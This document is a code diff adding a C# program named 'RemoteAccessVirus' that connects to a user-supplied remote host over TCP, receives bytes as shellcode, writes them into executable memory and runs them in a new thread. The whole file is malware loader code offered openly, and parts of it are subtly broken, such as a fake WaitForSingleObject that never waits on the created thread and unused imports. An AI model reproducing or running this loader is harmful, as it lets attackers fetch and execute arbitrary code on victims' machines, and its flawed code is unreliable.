@@ -1,0 +1,99 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+
+namespace RemoteAccessVirus
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool IsDebuggerPresent();
+
+        private const uint MEM_COMMIT = 0x1000;
+        private const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+        static void Main(string[] args)
+        {
+            Console.Write("Enter the remote IP address: ");
+            string remoteAddress = Console.ReadLine();
+
+            int remotePort;
+            while (!int.TryParse(Console.ReadLine(), out remotePort))
+            {
+                Console.Write("Invalid port. Please enter a valid port: ");
+            }
+
+            byte[] shellcode = GetShellcode(remoteAddress, remotePort);
+            if (shellcode == null)
+            {
+                Console.WriteLine("Failed to retrieve shellcode. Exiting.");
+                return;
+            }
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, uint.MaxValue);
+        }
+
+        private static byte[] GetShellcode(string remoteAddress, int remotePort)
+        {
+            Console.Write("Enter the shellcode: ");
+            string shellcode = Console.ReadLine();
+            byte[] encodedShellcode = Encoding.UTF8.GetBytes(shellcode);
+
+            try
+            {
+                using (TcpClient client = new TcpClient())
+                {
+                    client.Connect(remoteAddress, remotePort);
+                    using (NetworkStream stream = client.GetStream())
+                    {
+                        stream.Write(encodedShellcode, 0, encodedShellcode.Length);
+                        byte[] response = new byte[256];
+                        int bytesRead = stream.Read(response, 0, response.Length);
+                        return response;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error: {ex.Message}");
+                return null;
+            }
+        }
+
+        private static void WaitForSingleObject(IntPtr hThread, uint dwMilliseconds)
+        {
+            Thread thread = new Thread(() =>
+            {
+                while (true)
+                {
+                    Thread.Sleep(1000);
+                }
+            });
+            thread.Start();
+            thread.Join((int)dwMilliseconds);
+        }
+    }
+}
